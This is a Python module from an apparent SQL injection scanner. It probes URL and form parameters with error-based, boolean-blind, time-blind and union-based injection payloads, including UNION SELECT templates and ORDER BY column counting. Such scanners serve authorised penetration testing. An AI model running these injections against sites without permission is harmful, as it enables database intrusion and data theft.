"""
AbsoluteSQL — Scanner
Detects SQL injection vulnerabilities across all technique types:
  Error-Based, Boolean-Based Blind, Time-Based Blind, Union-Based.
"""

import time
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Tuple

from .config import (
    INJ_ERROR, INJ_UNION, INJ_BOOLEAN, INJ_TIME,
    UNION_MAX_COLS, TIME_DELAY, TIME_THRESHOLD, BLIND_CONFIDENCE
)
from .payloads import (
    get_error_payloads, get_boolean_pairs, get_time_payloads,
    get_union_order_by, get_union_null_test, UNION_MARKER,
    detect_dbms_from_errors
)
from .http_client import HTTPClient
from .detector import ResponseAnalyzer
from .utils import log, inject_param, extract_params, extract_form_params


@dataclass
class Vulnerability:
    url:         str
    param:       str
    method:      str
    inj_type:    str
    payload:     str
    dbms:        Optional[str]      = None
    union_cols:  Optional[int]      = None
    union_idx:   Optional[int]      = None   # which column carries string output
    confidence:  float              = 1.0
    evidence:    str                = ""

    def label(self) -> str:
        from .config import INJ_TYPE_LABELS
        return INJ_TYPE_LABELS.get(self.inj_type, self.inj_type)


@dataclass
class ScanResult:
    url:            str
    method:         str
    params_tested:  List[str]        = field(default_factory=list)
    vulns:          List[Vulnerability] = field(default_factory=list)
    waf:            Optional[str]    = None
    dbms:           Optional[str]    = None
    requests_sent:  int              = 0
    elapsed:        float            = 0.0

    @property
    def vulnerable(self) -> bool:
        return len(self.vulns) > 0

    def best_vuln(self) -> Optional[Vulnerability]:
        """Return most exploitable vulnerability."""
        priority = {INJ_ERROR: 0, INJ_UNION: 1, INJ_BOOLEAN: 2, INJ_TIME: 3}
        if not self.vulns:
            return None
        return min(self.vulns, key=lambda v: priority.get(v.inj_type, 99))


class ParameterExtractor:
    """
    Extracts injectable parameters from URL query strings and HTML forms.
    """

    def from_url(self, url: str) -> List[Tuple[str, str, str]]:
        """
        Returns list of (url, param_name, current_value) from query string.
        """
        params = extract_params(url)
        return [(url, k, v) for k, v in params.items()]

    def from_forms(
        self,
        url:  str,
        html: str,
        base: str,
    ) -> List[Tuple[str, str, Dict, str]]:
        """
        Returns list of (action_url, param_name, all_params, method) tuples.
        """
        results = []
        forms   = extract_form_params(html)
        for form in forms:
            action = form["action"] or url
            if action.startswith("/"):
                action = base.rstrip("/") + action
            elif not action.startswith("http"):
                action = url.rsplit("/", 1)[0] + "/" + action

            for param in form["params"]:
                results.append((action, param, form["params"], form["method"]))
        return results


class VulnerabilityScanner:
    """
    Core scanning engine. Tests each parameter for every injection type.
    """

    def __init__(self, client: HTTPClient) -> None:
        self.client   = client
        self.analyzer = ResponseAnalyzer()

    # ── Error-Based ───────────────────────────────────────────────────────────
    def scan_error_based(
        self,
        url:    str,
        param:  str,
        value:  str,
        method: str = "GET",
    ) -> Optional[Vulnerability]:
        """
        Injects quote characters and looks for SQL error messages in the response.
        Returns Vulnerability if found.
        """
        for payload in get_error_payloads():
            injected = value + payload
            r = self._send(url, param, injected, method)
            if r is None:
                continue

            found, dbms = self.analyzer.is_error_based(r.text)
            if found:
                log.info(f"[error-based] {param} @ {url} — payload: {payload!r}")
                snippet = self._extract_error_snippet(r.text)
                return Vulnerability(
                    url=url, param=param, method=method,
                    inj_type=INJ_ERROR, payload=payload,
                    dbms=dbms, confidence=0.98,
                    evidence=snippet,
                )
        return None

    # ── Boolean-Based ─────────────────────────────────────────────────────────
    def scan_boolean_based(
        self,
        url:    str,
        param:  str,
        value:  str,
        method: str = "GET",
    ) -> Optional[Vulnerability]:
        """
        Sends true/false condition pairs and compares response size/content.
        """
        baseline_r = self._send(url, param, value, method)
        if baseline_r is None:
            return None
        baseline_text = baseline_r.text

        pairs = get_boolean_pairs()
        hits  = 0
        last_payload = ""

        for true_payload, false_payload in pairs[:8]:
            true_r  = self._send(url, param, value + true_payload,  method)
            false_r = self._send(url, param, value + false_payload, method)

            injectable, confidence = self.analyzer.compare(true_r, false_r, baseline_text)
            if injectable:
                hits += 1
                last_payload = true_payload
                if hits >= 2:  # require 2 confirmations
                    log.info(f"[boolean-based] {param} @ {url} — confidence {confidence:.2f}")
                    return Vulnerability(
                        url=url, param=param, method=method,
                        inj_type=INJ_BOOLEAN, payload=last_payload,
                        confidence=confidence,
                        evidence=f"Response length diff detected (true vs false condition)",
                    )
        return None

    # ── Time-Based ────────────────────────────────────────────────────────────
    def scan_time_based(
        self,
        url:    str,
        param:  str,
        value:  str,
        method: str   = "GET",
        dbms:   str   = "generic",
        delay:  int   = TIME_DELAY,
    ) -> Optional[Vulnerability]:
        """
        Measures response time after injecting a sleep/wait payload.
        Requires two confirmations to reduce false positives.
        """
        payloads = get_time_payloads(dbms, delay)
        confirmed = 0

        for payload in payloads[:6]:
            injected = value + payload
            if method == "GET":
                test_url = inject_param(url, param, injected)
                _, elapsed = self.client.timed_get(test_url, forced_timeout=delay * 3)
            else:
                _, elapsed = self.client.timed_post(url, data={param: injected}, forced_timeout=delay * 3)

            if elapsed >= delay * 0.85:
                confirmed += 1
                log.info(f"[time-based] {param} @ {url} — elapsed {elapsed:.2f}s")
                if confirmed >= 2:
                    return Vulnerability(
                        url=url, param=param, method=method,
                        inj_type=INJ_TIME, payload=payload,
                        dbms=dbms if dbms != "generic" else None,
                        confidence=0.90,
                        evidence=f"Response delayed by ~{elapsed:.1f}s (expected ≥{delay}s)",
                    )
        return None

    # ── Union-Based ───────────────────────────────────────────────────────────
    def scan_union_based(
        self,
        url:    str,
        param:  str,
        value:  str,
        method: str = "GET",
    ) -> Optional[Vulnerability]:
        """
        Determines column count via ORDER BY, then finds a string-injectable
        column via UNION SELECT. Returns Vulnerability with cols + idx.
        """
        col_count = self._find_column_count(url, param, value, method)
        if col_count is None:
            return None

        string_idx = self._find_string_column(url, param, value, method, col_count)
        if string_idx is None:
            return None

        log.info(f"[union-based] {param} @ {url} — {col_count} cols, string at idx {string_idx}")
        payload = f"' UNION SELECT {','.join(['NULL'] * col_count)}-- (col_count={col_count})"
        return Vulnerability(
            url=url, param=param, method=method,
            inj_type=INJ_UNION, payload=payload,
            union_cols=col_count, union_idx=string_idx,
            confidence=0.99,
            evidence=f"UNION SELECT reflected marker in {col_count}-column result set (col {string_idx})",
        )

    def _find_column_count(
        self,
        url:    str,
        param:  str,
        value:  str,
        method: str,
    ) -> Optional[int]:
        """Binary search for column count via ORDER BY."""
        # Try ORDER BY N until we get an error (column out of range)
        last_ok = None
        for n in range(1, UNION_MAX_COLS + 1):
            for payload in get_union_order_by(n)[:2]:
                r = self._send(url, param, value + payload, method)
                if r is None:
                    continue
                has_error, _ = self.analyzer.is_error_based(r.text)
                if has_error or r.status_code >= 400:
                    return last_ok
                last_ok = n
                break  # this N succeeded; move to next
        return last_ok

    def _find_string_column(
        self,
        url:      str,
        param:    str,
        value:    str,
        method:   str,
        col_count: int,
    ) -> Optional[int]:
        """Try each column position with a string marker to find a reflected one."""
        for idx in range(1, col_count + 1):
            cols = ["NULL"] * col_count
            cols[idx - 1] = f"'{UNION_MARKER}'"
            null_str = ",".join(cols)

            for tmpl in [
                f"' UNION SELECT {null_str}--",
                f"' UNION ALL SELECT {null_str}--",
                f"-1 UNION SELECT {null_str}--",
            ]:
                r = self._send(url, param, value + tmpl, method)
                if r and UNION_MARKER in r.text:
                    return idx
        return None

    # ── Full parameter scan ────────────────────────────────────────────────────
    def scan_parameter(
        self,
        url:    str,
        param:  str,
        value:  str,
        method: str = "GET",
        dbms:   str = "generic",
    ) -> List[Vulnerability]:
        """
        Run all injection types on one parameter.
        Stops at the most exploitable type found first.
        """
        found = []

        # 1. Error-based (fastest, most definitive)
        v = self.scan_error_based(url, param, value, method)
        if v:
            found.append(v)

        # 2. Union-based
        v = self.scan_union_based(url, param, value, method)
        if v:
            found.append(v)

        # 3. Boolean-based blind
        v = self.scan_boolean_based(url, param, value, method)
        if v:
            found.append(v)

        # 4. Time-based blind (slowest, last resort)
        if not found:
            v = self.scan_time_based(url, param, value, method, dbms=dbms)
            if v:
                found.append(v)

        return found

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _send(
        self,
        url:    str,
        param:  str,
        value:  str,
        method: str,
    ):
        if method == "GET":
            return self.client.get(inject_param(url, param, value))
        else:
            return self.client.post(url, data={param: value})

    @staticmethod
    def _extract_error_snippet(text: str, max_len: int = 200) -> str:
        """Pull the first error-looking line from a response body."""
        import re
        for line in text.splitlines():
            line = line.strip()
            if any(kw in line.lower() for kw in ("error", "syntax", "warning", "ora-", "sqlite")):
                return line[:max_len]
        return text[:max_len]
